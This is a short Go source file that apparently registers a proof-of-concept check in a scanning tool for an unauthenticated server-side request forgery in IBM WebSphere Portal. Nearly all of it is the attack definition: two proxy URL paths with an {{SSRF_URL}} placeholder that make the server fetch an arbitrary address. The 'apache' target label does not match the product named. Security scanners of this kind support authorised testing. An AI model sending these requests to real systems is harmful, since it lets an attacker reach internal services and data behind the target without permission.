package poc

func (Info *PocInfo) IBM_WebSphere_Portal_SSRF_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "apache"
	poc.Info.Type = "SSRF"
	poc.Info.Name = "IBM WebSphere Portal Unauth SSRF"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/docpicker/internal_proxy/http/{{SSRF_URL}}", "/wps/PA_WCM_Authoring_UI/proxy/http/{{SSRF_URL}}"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = nil

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
